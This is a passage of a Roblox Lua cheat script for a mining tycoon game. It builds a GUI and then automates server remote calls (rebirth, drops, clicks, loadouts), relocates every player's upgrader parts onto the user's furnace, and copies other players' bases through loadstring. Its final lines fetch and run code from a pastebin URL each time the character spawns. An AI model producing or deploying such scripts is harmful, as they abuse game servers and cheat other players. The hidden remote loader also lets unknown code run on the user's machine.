Deco_32.TextXAlignment = Enum.TextXAlignment.Left

Deco_33.Name = "Deco"
Deco_33.Parent = AutoLoadoutContents
Deco_33.AnchorPoint = Vector2.new(0, 0.5)
Deco_33.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_33.BackgroundTransparency = 1
Deco_33.Position = UDim2.new(0, 0, 2.5, 0)
Deco_33.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_33.ZIndex = 5
Deco_33.Font = Enum.Font.ArialBold
Deco_33.Text = "Loadout 3:"
Deco_33.TextScaled = true
Deco_33.TextSize = 14
Deco_33.TextWrapped = true
Deco_33.TextXAlignment = Enum.TextXAlignment.Left

AutoLoadout2Toggle.Name = "AutoLoadout2Toggle"
AutoLoadout2Toggle.Parent = AutoLoadoutContents
AutoLoadout2Toggle.AnchorPoint = Vector2.new(0, 0.5)
AutoLoadout2Toggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
AutoLoadout2Toggle.BorderSizePixel = 0
AutoLoadout2Toggle.Position = UDim2.new(0.550000012, 0, 1.5, 0)
AutoLoadout2Toggle.Size = UDim2.new(0.400000006, 0, 0, 30)
AutoLoadout2Toggle.ZIndex = 5
AutoLoadout2Toggle.Font = Enum.Font.ArialBold
AutoLoadout2Toggle.Text = ""
AutoLoadout2Toggle.TextScaled = true
AutoLoadout2Toggle.TextSize = 40
AutoLoadout2Toggle.TextWrapped = true

AutoLoadout2On.Name = "AutoLoadout2On"
AutoLoadout2On.Parent = AutoLoadout2Toggle
AutoLoadout2On.BackgroundColor3 = Color3.new(0, 0.796079, 0)
AutoLoadout2On.BorderSizePixel = 0
AutoLoadout2On.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoLoadout2On.Visible = false
AutoLoadout2On.ZIndex = 5

Deco_34.Name = "Deco"
Deco_34.Parent = AutoLoadout2On
Deco_34.AnchorPoint = Vector2.new(0, 0.5)
Deco_34.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_34.BackgroundTransparency = 1
Deco_34.Position = UDim2.new(0, 0, 0.5, 0)
Deco_34.Size = UDim2.new(1, 0, 1, 0)
Deco_34.ZIndex = 5
Deco_34.Font = Enum.Font.ArialBold
Deco_34.Text = "ON"
Deco_34.TextScaled = true
Deco_34.TextSize = 14
Deco_34.TextWrapped = true
Deco_34.TextXAlignment = Enum.TextXAlignment.Left

Deco_35.Name = "Deco"
Deco_35.Parent = AutoLoadout2On
Deco_35.AnchorPoint = Vector2.new(1, 0)
Deco_35.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_35.BackgroundTransparency = 1
Deco_35.Position = UDim2.new(1, 0, 0, 0)
Deco_35.Size = UDim2.new(1, 0, 1, 0)
Deco_35.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_35.ZIndex = 5
Deco_35.Image = "rbxassetid://1042585012"
Deco_35.ImageTransparency = 0.5

AutoLoadout2Off.Name = "AutoLoadout2Off"
AutoLoadout2Off.Parent = AutoLoadout2Toggle
AutoLoadout2Off.AnchorPoint = Vector2.new(1, 0)
AutoLoadout2Off.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
AutoLoadout2Off.BorderSizePixel = 0
AutoLoadout2Off.Position = UDim2.new(1, 0, 0, 0)
AutoLoadout2Off.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoLoadout2Off.ZIndex = 5

Deco_36.Name = "Deco"
Deco_36.Parent = AutoLoadout2Off
Deco_36.AnchorPoint = Vector2.new(0, 0.5)
Deco_36.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_36.BackgroundTransparency = 1
Deco_36.Position = UDim2.new(0, 0, 0.5, 0)
Deco_36.Size = UDim2.new(1, 0, 1, 0)
Deco_36.ZIndex = 5
Deco_36.Font = Enum.Font.ArialBold
Deco_36.Text = "OFF"
Deco_36.TextScaled = true
Deco_36.TextSize = 14
Deco_36.TextWrapped = true
Deco_36.TextXAlignment = Enum.TextXAlignment.Right

Deco_37.Name = "Deco"
Deco_37.Parent = AutoLoadout2Off
Deco_37.AnchorPoint = Vector2.new(1, 0)
Deco_37.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_37.BackgroundTransparency = 1
Deco_37.Position = UDim2.new(1, 0, 0, 0)
Deco_37.Size = UDim2.new(1, 0, 1, 0)
Deco_37.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_37.ZIndex = 5
Deco_37.Image = "rbxassetid://1042585012"
Deco_37.ImageTransparency = 0.5

AutoLoadout3Toggle.Name = "AutoLoadout3Toggle"
AutoLoadout3Toggle.Parent = AutoLoadoutContents
AutoLoadout3Toggle.AnchorPoint = Vector2.new(0, 0.5)
AutoLoadout3Toggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
AutoLoadout3Toggle.BorderSizePixel = 0
AutoLoadout3Toggle.Position = UDim2.new(0.550000012, 0, 2.5, 0)
AutoLoadout3Toggle.Size = UDim2.new(0.400000006, 0, 0, 30)
AutoLoadout3Toggle.ZIndex = 5
AutoLoadout3Toggle.Font = Enum.Font.ArialBold
AutoLoadout3Toggle.Text = ""
AutoLoadout3Toggle.TextScaled = true
AutoLoadout3Toggle.TextSize = 40
AutoLoadout3Toggle.TextWrapped = true

AutoLoadout3On.Name = "AutoLoadout3On"
AutoLoadout3On.Parent = AutoLoadout3Toggle
AutoLoadout3On.BackgroundColor3 = Color3.new(0, 0.796079, 0)
AutoLoadout3On.BorderSizePixel = 0
AutoLoadout3On.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoLoadout3On.Visible = false
AutoLoadout3On.ZIndex = 5

Deco_38.Name = "Deco"
Deco_38.Parent = AutoLoadout3On
Deco_38.AnchorPoint = Vector2.new(0, 0.5)
Deco_38.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_38.BackgroundTransparency = 1
Deco_38.Position = UDim2.new(0, 0, 0.5, 0)
Deco_38.Size = UDim2.new(1, 0, 1, 0)
Deco_38.ZIndex = 5
Deco_38.Font = Enum.Font.ArialBold
Deco_38.Text = "ON"
Deco_38.TextScaled = true
Deco_38.TextSize = 14
Deco_38.TextWrapped = true
Deco_38.TextXAlignment = Enum.TextXAlignment.Left

Deco_39.Name = "Deco"
Deco_39.Parent = AutoLoadout3On
Deco_39.AnchorPoint = Vector2.new(1, 0)
Deco_39.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_39.BackgroundTransparency = 1
Deco_39.Position = UDim2.new(1, 0, 0, 0)
Deco_39.Size = UDim2.new(1, 0, 1, 0)
Deco_39.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_39.ZIndex = 5
Deco_39.Image = "rbxassetid://1042585012"
Deco_39.ImageTransparency = 0.5

AutoLoadout3Off.Name = "AutoLoadout3Off"
AutoLoadout3Off.Parent = AutoLoadout3Toggle
AutoLoadout3Off.AnchorPoint = Vector2.new(1, 0)
AutoLoadout3Off.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
AutoLoadout3Off.BorderSizePixel = 0
AutoLoadout3Off.Position = UDim2.new(1, 0, 0, 0)
AutoLoadout3Off.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoLoadout3Off.ZIndex = 5

Deco_40.Name = "Deco"
Deco_40.Parent = AutoLoadout3Off
Deco_40.AnchorPoint = Vector2.new(0, 0.5)
Deco_40.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_40.BackgroundTransparency = 1
Deco_40.Position = UDim2.new(0, 0, 0.5, 0)
Deco_40.Size = UDim2.new(1, 0, 1, 0)
Deco_40.ZIndex = 5
Deco_40.Font = Enum.Font.ArialBold
Deco_40.Text = "OFF"
Deco_40.TextScaled = true
Deco_40.TextSize = 14
Deco_40.TextWrapped = true
Deco_40.TextXAlignment = Enum.TextXAlignment.Right

Deco_41.Name = "Deco"
Deco_41.Parent = AutoLoadout3Off
Deco_41.AnchorPoint = Vector2.new(1, 0)
Deco_41.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_41.BackgroundTransparency = 1
Deco_41.Position = UDim2.new(1, 0, 0, 0)
Deco_41.Size = UDim2.new(1, 0, 1, 0)
Deco_41.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_41.ZIndex = 5
Deco_41.Image = "rbxassetid://1042585012"
Deco_41.ImageTransparency = 0.5

Deco_42.Name = "Deco"
Deco_42.Parent = AutoLoadout
Deco_42.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_42.BackgroundTransparency = 1
Deco_42.Position = UDim2.new(0, 0, 1, -20)
Deco_42.Size = UDim2.new(1, 0, 0, 20)
Deco_42.ZIndex = 5
Deco_42.Font = Enum.Font.Arial
Deco_42.Text = "Automatically loads a pre-saved loadout."
Deco_42.TextColor3 = Color3.new(0, 0, 0)
Deco_42.TextScaled = true
Deco_42.TextSize = 14
Deco_42.TextTransparency = 0.69999998807907
Deco_42.TextWrapped = true

OreBooster.Name = "OreBooster"
OreBooster.Parent = Contents
OreBooster.BackgroundColor3 = Color3.new(1, 1, 1)
OreBooster.BackgroundTransparency = 1
OreBooster.LayoutOrder = 7
OreBooster.Size = UDim2.new(1, -20, 0, 60)
OreBooster.ZIndex = 5
OreBooster.Image = "rbxassetid://875052259"
OreBooster.ImageColor3 = Color3.new(0.0313726, 0.427451, 0.596078)
OreBooster.ScaleType = Enum.ScaleType.Slice
OreBooster.SliceCenter = Rect.new(10, 10, 10, 10)

OreBoosterContents.Name = "OreBoosterContents"
OreBoosterContents.Parent = OreBooster
OreBoosterContents.BackgroundColor3 = Color3.new(1, 1, 1)
OreBoosterContents.BackgroundTransparency = 1
OreBoosterContents.BorderSizePixel = 0
OreBoosterContents.Size = UDim2.new(1, 0, 0, 40)
OreBoosterContents.ZIndex = 5

OreBoosterButton.Name = "OreBoosterButton"
OreBoosterButton.Parent = OreBoosterContents
OreBoosterButton.AnchorPoint = Vector2.new(0, 0.5)
OreBoosterButton.BackgroundColor3 = Color3.new(0, 0.827451, 0.839216)
OreBoosterButton.BorderSizePixel = 0
OreBoosterButton.Position = UDim2.new(0.0500000007, 0, 0.5, 0)
OreBoosterButton.Size = UDim2.new(0.800000012, 0, 0, 30)
OreBoosterButton.ZIndex = 5
OreBoosterButton.Font = Enum.Font.ArialBold
OreBoosterButton.FontSize = Enum.FontSize.Size48
OreBoosterButton.Text = "Ore Booster"
OreBoosterButton.TextScaled = true
OreBoosterButton.TextSize = 40
OreBoosterButton.TextWrapped = true

Deco_43.Name = "Deco"
Deco_43.Parent = OreBoosterButton
Deco_43.AnchorPoint = Vector2.new(1, 0)
Deco_43.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_43.BackgroundTransparency = 1
Deco_43.Position = UDim2.new(1, 0, 0, 0)
Deco_43.Size = UDim2.new(1, 0, 1, 0)
Deco_43.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_43.ZIndex = 5
Deco_43.Image = "rbxassetid://1042585012"
Deco_43.ImageTransparency = 0.30000001192093

Deco_44.Name = "Deco"
Deco_44.Parent = OreBooster
Deco_44.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_44.BackgroundTransparency = 1
Deco_44.Position = UDim2.new(0, 0, 1, -20)
Deco_44.Size = UDim2.new(1, 0, 0, 20)
Deco_44.ZIndex = 5
Deco_44.Font = Enum.Font.Arial
Deco_44.FontSize = Enum.FontSize.Size14
Deco_44.Text = "Requires one furnace on your base. Ores will be upgraded."
Deco_44.TextColor3 = Color3.new(0, 0, 0)
Deco_44.TextScaled = true
Deco_44.TextSize = 14
Deco_44.TextTransparency = 0.69999998807907
Deco_44.TextWrapped = true

Top.Name = "Top"
Top.Parent = Rocket
Top.BackgroundColor3 = Color3.new(1, 1, 1)
Top.BackgroundTransparency = 1
Top.Position = UDim2.new(0, 0, 0, -32)
Top.Size = UDim2.new(0.349999994, 0, 0, 32)
Top.ZIndex = 4
Top.Image = "rbxassetid://875052259"
Top.ImageColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Top.ScaleType = Enum.ScaleType.Slice
Top.SliceCenter = Rect.new(10, 10, 10, 10)

Title_5.Name = "Title"
Title_5.Parent = Top
Title_5.BackgroundColor3 = Color3.new(1, 1, 1)
Title_5.BackgroundTransparency = 1
Title_5.Size = UDim2.new(1, 0, 1, 0)
Title_5.ZIndex = 4
Title_5.Font = Enum.Font.SourceSansBold
Title_5.Text = "Rocket"
Title_5.TextColor3 = Color3.new(1, 1, 1)
Title_5.TextScaled = true
Title_5.TextSize = 14
Title_5.TextWrapped = true

Close.Name = "Close"
Close.Parent = Top
Close.BackgroundColor3 = Color3.new(1, 0.294118, 0.305882)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(1, 0, 0, 0)
Close.Size = UDim2.new(0, 40, 1, 0)
Close.ZIndex = 4
Close.Modal = true
Close.Selected = true
Close.Font = Enum.Font.ArialBold
Close.Text = "X"
Close.TextScaled = true
Close.TextSize = 14
Close.TextWrapped = true

Depth.Name = "Depth"
Depth.Parent = Top
Depth.BackgroundColor3 = Color3.new(1, 1, 1)
Depth.BackgroundTransparency = 1
Depth.Position = UDim2.new(0, 0, 0, 6)
Depth.Size = UDim2.new(1, 0, 1, 0)
Depth.ZIndex = 2
Depth.Image = "rbxassetid://875052259"
Depth.ImageColor3 = Color3.new(0.356863, 0.356863, 0.356863)
Depth.ScaleType = Enum.ScaleType.Slice
Depth.SliceCenter = Rect.new(10, 10, 10, 10)

Depth_2.Name = "Depth"
Depth_2.Parent = Rocket
Depth_2.BackgroundColor3 = Color3.new(1, 1, 1)
Depth_2.BackgroundTransparency = 1
Depth_2.Position = UDim2.new(0, 0, 0, 6)
Depth_2.Size = UDim2.new(1, 0, 1, 0)
Depth_2.ZIndex = 4
Depth_2.Image = "rbxassetid://875052259"
Depth_2.ImageColor3 = Color3.new(0.356863, 0.356863, 0.356863)
Depth_2.ScaleType = Enum.ScaleType.Slice
Depth_2.SliceCenter = Rect.new(10, 10, 10, 10)

UISizeConstraint.Parent = Rocket
UISizeConstraint.MaxSize = Vector2.new(500, 450)


AddCloverButton.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Clovers.Value = game.Players.LocalPlayer.Clovers.Value+1
end)

AddTwitchCoinButton.MouseButton1Down:connect(function()
game.Players.LocalPlayer.TwitchPoints.Value = game.Players.LocalPlayer.TwitchPoints.Value+1
end)

OreBoosterButton.MouseButton1Down:connect(function()
local factory = nil
local lava = nil
local a = workspace.Tycoons:getDescendants()
for i=1,#a do
if a[i].Name == "Owner" then 
if a[i].Value == game.Players.LocalPlayer.Name then
factory = a[i].Parent
end
end
end

local furnace = factory:getDescendants()
for i=1,#furnace do 
if furnace[i].Name == "Lava" then 
lava = furnace[i]
end
end

local upgrade = workspace.Tycoons:getDescendants()
for i=1,#upgrade do 
if upgrade[i].Name == "Upgrade" then 
local deco = upgrade[i]:getChildren()
for i=1,#deco do
if deco[i].Name == "TouchInterest" then
else
deco[i]:remove()
end
end
upgrade[i].Size = lava.Size
upgrade[i].Transparency = 1
upgrade[i].Position = lava.Position
end
end
end)

local autorebirth = false
AutoRebirthToggle.MouseButton1Down:connect(function()
if AutoRebirthOn.Visible == false then
AutoRebirthOn.Visible = true
AutoRebirthOff.Visible = false
autorebirth = true
else
AutoRebirthOn.Visible = false
AutoRebirthOff.Visible = true
autorebirth = false
end
end)

spawn(function()
while true do
wait(1)
if autorebirth == true then
game.ReplicatedStorage.Rebirth:InvokeServer()
end
end
end)


local autoremote = false
AutoRemoteToggle.MouseButton1Down:connect(function()
if autoremote == false then
AutoRemoteOn.Visible = true
AutoRemoteOff.Visible = false
autoremote = true
else
AutoRemoteOn.Visible = false
AutoRemoteOff.Visible = true
autoremote = false
end
end)

spawn(function()
while true do
wait()
if autoremote == true then
game.ReplicatedStorage.RemoteDrop:FireServer()
end
end
end)



NotificationsToggle.MouseButton1Down:connect(function()
if NotificationsOn.Visible == false then
NotificationsOn.Visible = true
NotificationsOff.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Menu.Menu.Sounds.Message.Volume = 0.5
game.Players.LocalPlayer.PlayerGui.GUI.Notifications.Visible = true
else
NotificationsOn.Visible = false
NotificationsOff.Visible = true
game.Players.LocalPlayer.PlayerGui.GUI.Menu.Menu.Sounds.Message.Volume = 0
game.Players.LocalPlayer.PlayerGui.GUI.Notifications.Visible = false
end
end)




local autobutton = false
AutoButtonToggle.MouseButton1Down:connect(function()
if autobutton == false then
AutoButtonOn.Visible = true
AutoButtonOff.Visible = false
autobutton = true
else
AutoButtonOn.Visible = false
AutoButtonOff.Visible = true
autobutton = false
end
end)




spawn (function()
while true do
wait(0.1)
if autobutton == true then
local clickymines = workspace.Tycoons[tostring(game.Players.LocalPlayer.PlayerTycoon.Value)]:GetChildren()
for i =1, #clickymines do
if clickymines[i].ClassName == "Model" then
if clickymines[i].Model:findFirstChild("Button") then
local de = clickymines[i].Model:GetChildren()
for i =1, #de do
if de[i].Name == "Button" then
game.ReplicatedStorage.Click:FireServer(de[i])
end
end
end
end
end
end
end
end)




local autoloadout1 = false
AutoLoadout1Toggle.MouseButton1Down:connect(function()
if autoloadout1 == false then
AutoLoadout1On.Visible = true
AutoLoadout1Off.Visible = false
autoloadout1 = true
else
AutoLoadout1On.Visible = false
AutoLoadout1Off.Visible = true
autoloadout1 = false
end
end)

spawn(function()
while true do
wait()
if autoloadout1 == true then
game.ReplicatedStorage.Layouts:InvokeServer("Load","Layout1")
else
end
end
end)



local autoloadout2 = false
AutoLoadout2Toggle.MouseButton1Down:connect(function()
if autoloadout2 == false then
AutoLoadout2On.Visible = true
AutoLoadout2Off.Visible = false
autoloadout2 = true
else
AutoLoadout2On.Visible = false
AutoLoadout2Off.Visible = true
autoloadout2 = false
end
end)

spawn(function()
while true do
wait()
if autoloadout2 == true then
game.ReplicatedStorage.Layouts:InvokeServer("Load","Layout2")
else
end
end
end)



local autoloadout3 = false
AutoLoadout3Toggle.MouseButton1Down:connect(function()
if autoloadout3 == false then
AutoLoadout3On.Visible = true
AutoLoadout3Off.Visible = false
autoloadout3 = true
else
AutoLoadout3On.Visible = false
AutoLoadout3Off.Visible = true
autoloadout3 = false
end
end)

spawn(function()
while true do
wait()
if autoloadout3 == true then
game.ReplicatedStorage.Layouts:InvokeServer("Load","Layout3")
else
end
end
end)

function steal(plr)
local buy = "buy"
local pos = "pos"
local savestring = "savestring"
local basename = "basename"

local tosteal = workspace.Tycoons:GetChildren()
for i=1,#tosteal do
if tosteal[i].Owner.Value == plr then
basename = tosteal[i].Name
end
end

savestring = "local plrbase = game.Players.LocalPlayer.PlayerTycoon.Value\n"
for i,v in pairs(workspace.Tycoons:findFirstChild(basename):GetChildren()) do
if v:IsA("Model") then
local posmaths = tostring(v.Hitbox.CFrame - workspace.Tycoons:findFirstChild(basename).Base.Position)
pos = tostring('local pos = CFrame.new(' .. posmaths .. ') + plrbase:FindFirstChild("Base").Position' .. '\n')
buy = tostring('game.ReplicatedStorage.BuyItem:InvokeServer("' .. v.Name .. '", 1)\n')
savestring = savestring .. pos .. buy .. tostring('game.ReplicatedStorage.PlaceItem:InvokeServer("' .. v.Name ..'", ' .. " pos)" .. '\n\n')
end
end
loadstring(savestring)()
end


local players = game.Players:getChildren()
for i=1,#players do
local PlayerButton = Instance.new("TextButton")
PlayerButton.Name = "PlayerButton"
PlayerButton.Parent = BaseStealerButtons
PlayerButton.AnchorPoint = Vector2.new(0, 0.5)
PlayerButton.BackgroundColor3 = players[i].TeamColor.Color
PlayerButton.BorderSizePixel = 0
PlayerButton.Position = UDim2.new(0.45, 0, 0.5, 0)
PlayerButton.Size = UDim2.new(0.8, 0, 0, 30)
PlayerButton.ZIndex = 5
PlayerButton.Font = Enum.Font.ArialBold
PlayerButton.TextScaled = true
PlayerButton.TextSize = 40
PlayerButton.TextWrapped = true
local Deco = Instance.new("ImageLabel")
Deco.Name = "Fold"
Deco.Parent = PlayerButton
Deco.AnchorPoint = Vector2.new(1, 0)
Deco.BackgroundColor3 = Color3.new(1, 1, 1)
Deco.BackgroundTransparency = 1
Deco.Position = UDim2.new(1, 0, 0, 0)
Deco.Size = UDim2.new(1, 0, 1, 0)
Deco.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco.ZIndex = 5
Deco.Image = "rbxassetid://1042585012"
Deco.ImageTransparency = 0.3
PlayerButton.Text = players[i].Name
PlayerButton.MouseButton1Down:connect(function()
game.ReplicatedStorage['DestroyAll']:InvokeServer()
steal(PlayerButton.Text)
end)
end

game.Players.PlayerAdded:Connect(function(player)
BaseStealerButtons:ClearAllChildren()
local players = game.Players:getChildren()
for i=1,#players do
local PlayerButton = Instance.new("TextButton")
PlayerButton.Name = "PlayerButton"
PlayerButton.Parent = BaseStealerButtons
PlayerButton.AnchorPoint = Vector2.new(0, 0.5)
PlayerButton.BackgroundColor3 = players[i].TeamColor.Color
PlayerButton.BorderSizePixel = 0
PlayerButton.Position = UDim2.new(0.45, 0, 0.5, 0)
PlayerButton.Size = UDim2.new(0.8, 0, 0, 30)
PlayerButton.ZIndex = 5
PlayerButton.Font = Enum.Font.ArialBold
PlayerButton.TextScaled = true
PlayerButton.TextSize = 40
PlayerButton.TextWrapped = true
local Deco = Instance.new("ImageLabel")
Deco.Name = "Fold"
Deco.Parent = PlayerButton
Deco.AnchorPoint = Vector2.new(1, 0)
Deco.BackgroundColor3 = Color3.new(1, 1, 1)
Deco.BackgroundTransparency = 1
Deco.Position = UDim2.new(1, 0, 0, 0)
Deco.Size = UDim2.new(1, 0, 1, 0)
Deco.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco.ZIndex = 5
Deco.Image = "rbxassetid://1042585012"
Deco.ImageTransparency = 0.3
PlayerButton.Text = players[i].Name
PlayerButton.MouseButton1Down:connect(function()
game.ReplicatedStorage['DestroyAll']:InvokeServer()
steal(PlayerButton.Text)
end)
end
local UIListLayout_3 = Instance.new("UIListLayout")
UIListLayout_3.Parent = BaseStealerButtons
UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
end)

game.Players.PlayerRemoving:Connect(function(player)
BaseStealerButtons:ClearAllChildren()
local players = game.Players:getChildren()
for i=1,#players do
local PlayerButton = Instance.new("TextButton")
PlayerButton.Name = "PlayerButton"
PlayerButton.Parent = BaseStealerButtons
PlayerButton.AnchorPoint = Vector2.new(0, 0.5)
PlayerButton.BackgroundColor3 = players[i].TeamColor.Color
PlayerButton.BorderSizePixel = 0
PlayerButton.Position = UDim2.new(0.45, 0, 0.5, 0)
PlayerButton.Size = UDim2.new(0.8, 0, 0, 30)
PlayerButton.ZIndex = 5
PlayerButton.Font = Enum.Font.ArialBold
PlayerButton.TextScaled = true
PlayerButton.TextSize = 40
PlayerButton.TextWrapped = true
local Deco = Instance.new("ImageLabel")
Deco.Name = "Fold"
Deco.Parent = PlayerButton
Deco.AnchorPoint = Vector2.new(1, 0)
Deco.BackgroundColor3 = Color3.new(1, 1, 1)
Deco.BackgroundTransparency = 1
Deco.Position = UDim2.new(1, 0, 0, 0)
Deco.Size = UDim2.new(1, 0, 1, 0)
Deco.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco.ZIndex = 5
Deco.Image = "rbxassetid://1042585012"
Deco.ImageTransparency = 0.3
PlayerButton.Text = players[i].Name
PlayerButton.MouseButton1Down:connect(function()
game.ReplicatedStorage['DestroyAll']:InvokeServer()
steal(PlayerButton.Text)
end)
end
local UIListLayout_3 = Instance.new("UIListLayout")
UIListLayout_3.Parent = BaseStealerButtons
UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
end)



Close.MouseButton1Down:connect(function()
game.Players.LocalPlayer.PlayerGui.GUI.Menu.Menu.Sounds.Click:Play()
Rocket.Visible = false
if game.Lighting.Blur.Size == 9 then
for i=1,18 do
game.Lighting.Blur.Size = game.Lighting.Blur.Size-0.5
wait()
end
end
end)
end)


spawn(function()
local function onCharacterAdded(character)
loadstring(game:HttpGet(('https://pastebin.com/raw/q1H44svQ'),true))()
end

game.Players.LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
 
end)